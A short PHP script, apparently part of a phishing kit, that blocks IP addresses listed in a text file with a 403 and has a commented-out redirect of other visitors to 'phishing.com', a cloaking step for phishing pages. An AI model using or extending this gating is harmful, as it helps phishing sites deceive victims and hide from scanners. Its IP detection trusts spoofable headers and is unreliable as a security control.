<?php
/* ---[ Check if IP Address is Blocked ]--- */
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}
else {
        $ip = $_SERVER['REMOTE_ADDR'];
}

$zCh = file_get_contents("visitors_ip.txt");
$visitors_ip = explode("\n", $zCh);

if (in_array($ip, $visitors_ip)) {
      header("HTTP/1.0 403 Forbidden");
}
elseif (!in_array($ip, $visitors_ip)) {
//header("Location: phishing.com");
}
?>
